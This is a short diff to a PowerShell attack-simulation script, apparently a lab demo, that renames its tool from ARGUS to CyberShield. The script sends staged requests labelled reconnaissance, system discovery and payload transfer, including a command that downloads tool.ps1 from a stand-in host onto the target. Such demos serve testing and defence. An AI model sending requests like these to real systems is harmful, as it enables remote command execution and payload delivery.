@@ -29,10 +29,10 @@ if (-not (Test-PrivateTarget $Target)) {
 
 Add-Type -AssemblyName System.Net.Http
 $httpClient = [Net.Http.HttpClient]::new()
-$httpClient.DefaultRequestHeaders.UserAgent.ParseAdd("PowerShell-ARGUS-Demo/1.0")
+$httpClient.DefaultRequestHeaders.UserAgent.ParseAdd("PowerShell-CyberShield-Demo/1.0")
 $baseUrl = "http://${Target}:$HttpPort"
 
-function Send-ArgusRequest {
+function Send-CyberShieldRequest {
     param(
         [string]$Label,
         [Net.Http.HttpMethod]$Method,
@@ -62,11 +62,11 @@ function Send-ArgusRequest {
 }
 
 try {
-    Send-ArgusRequest "HTTP reconnaissance" ([Net.Http.HttpMethod]::Get) "/admin/config"
-    Send-ArgusRequest "System discovery" ([Net.Http.HttpMethod]::Post) "/ops/run" (
+    Send-CyberShieldRequest "HTTP reconnaissance" ([Net.Http.HttpMethod]::Get) "/admin/config"
+    Send-CyberShieldRequest "System discovery" ([Net.Http.HttpMethod]::Post) "/ops/run" (
         @{ command = "Get-Process | Select-Object Name,Id" } | ConvertTo-Json -Compress
     )
-    Send-ArgusRequest "Payload transfer" ([Net.Http.HttpMethod]::Post) "/api/jobs" (
+    Send-CyberShieldRequest "Payload transfer" ([Net.Http.HttpMethod]::Post) "/api/jobs" (
         @{ command = "Invoke-WebRequest http://lab.invalid/tool.ps1 -OutFile C:\Temp\tool.ps1" } |
             ConvertTo-Json -Compress
     )
